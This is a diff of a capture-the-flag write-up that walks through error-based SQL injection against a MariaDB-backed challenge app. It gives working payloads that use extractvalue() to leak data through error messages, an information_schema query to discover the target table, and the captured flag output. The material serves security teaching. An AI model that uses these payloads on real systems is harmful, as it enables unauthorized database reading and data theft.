@@ -59,33 +59,75 @@ The page's error panel echoes the raw exception, same pattern as p1_1,
 but this time it's the entire exploit surface, not just a fingerprinting
 tell.
 
-**2. Build the payload.** The working payload against this seed:
+**2. Prove the error message isn't just noisy, it's a read primitive.**
+`extractvalue(xml_frag, xpath_expr)` rejects anything that isn't valid
+XPath and quotes back (up to ~32 chars of) whatever `xpath_expr`
+evaluated to. Since `xpath_expr` can be a subquery, this is a channel
+that reads whatever you point it at, not just a crash:
 
 ```
-1' AND extractvalue(1,concat(0x3a,(SELECT secret FROM vault LIMIT 1)))-- -
+id=1' AND extractvalue(1,concat(0x7e,'canary-value'))-- -
 ```
 
-- `1'` closes the string literal the app opened with `id='...'`.
-- `AND extractvalue(1, ...)` appends a second condition to the `WHERE`
-  clause. `extractvalue()`'s first argument (`1`) is a throwaway XML doc,
-  it's never reached, because argument two fails to parse first.
-- `concat(0x3a, (SELECT secret FROM vault LIMIT 1))` builds the "XPath
-  expression" at query time: `0x3a` is a hex literal for `:` (a harmless
-  separator that also makes the leaked value easy to spot in the error
-  text), concatenated with the actual subquery, `SELECT secret FROM
-  vault LIMIT 1`, which reads the very column the app's own `SELECT name
-  FROM vault ...` never touches.
-- `-- -` comments out the rest of the original query (the trailing
-  `'` and anything else the app appends), so the statement still parses
-  as a whole.
+```
+(1105, "XPATH syntax error: '~canary-value'")
+```
 
-**3. MariaDB evaluates the subquery first**, gets back the flag string,
-concatenates it after `:`, hands that to `extractvalue()` as its XPath
+Your own literal string came back inside the DBMS's own error. `0x7e`
+is just a hex literal for `~`, a visible marker so the leaked value is
+easy to spot in the text; it carries no special meaning to MariaDB.
+
+**3. Don't assume the table name, find it.** Nothing so far has named
+`vault`. The only things known at this point are what the *app itself*
+already reveals: the ordinary lookup selects a `name` column, and
+`CHALLENGER.md`'s objective names `secret` as the field being chased.
+MariaDB's own `information_schema` can answer "which table has both,"
+without ever touching the app's source:
+
+```
+id=1' AND extractvalue(1,concat(0x7e,(SELECT c1.table_name
+    FROM information_schema.columns c1
+    WHERE c1.table_schema=database() AND c1.column_name='secret'
+    AND EXISTS (SELECT 1 FROM information_schema.columns c2
+                WHERE c2.table_schema=c1.table_schema
+                AND c2.table_name=c1.table_name
+                AND c2.column_name='name')
+    LIMIT 1)))-- -
+```
+
+```
+(1105, "XPATH syntax error: '~vault'")
+```
+
+Two things worth calling out about this step:
+
+- Filtering on `column_name='secret'` alone is **not** enough. This
+  MariaDB instance is one shared schema across every phase of the whole
+  arc, `records`, `keeper`, `sealed_cards`, `examiner_vault`, and others
+  all have their own `secret` column too. The `name`+`secret` combination
+  is what actually narrows it down to this floor's table, matching the
+  one query shape (`SELECT name FROM <table> WHERE id=...`) the app
+  visibly runs.
+- A cruder first instinct, dumping every table name in the schema via
+  `group_concat(table_name)`, genuinely doesn't work here: the result is
+  long enough (dozens of tables across 18 floors) that it blows straight
+  through `extractvalue()`'s ~32-character truncation before you ever
+  see something recognizable. The targeted, column-shape-aware query
+  above is the one that actually fits in that window.
+
+**4. Now extract the secret**, from the table this step actually found:
+
+```
+1' AND extractvalue(1,concat(0x7e,(SELECT secret FROM vault LIMIT 1)))-- -
+```
+
+**5. MariaDB evaluates the subquery first**, gets back the flag string,
+concatenates it after `~`, hands that to `extractvalue()` as its XPath
 argument, and `extractvalue()` immediately rejects it as invalid XPath.
 The resulting exception, verbatim from this exact seed and route:
 
 ```
-(1105, "XPATH syntax error: ':SEIYAKU{100_type_error_leak}'")
+(1105, "XPATH syntax error: '~SEIYAKU{100_type_error_leak}'")
 ```
 
 The flag is short enough (well under MariaDB's ~32-character truncation
@@ -93,7 +135,7 @@ window for this error) to come through whole in a single request, no
 need to binary-search or `SUBSTRING()` it out character by character, the
 way blind boolean/time-based techniques would require.
 
-**4.** `challenges/phase1.py`'s `except` block catches that exception,
+**6.** `challenges/phase1.py`'s `except` block catches that exception,
 stores `str(exc)` in `error`, and `templates/p1_recipe.html` prints it
 verbatim in the "the vault stumbled over your query" panel. The flag is
 on the page.
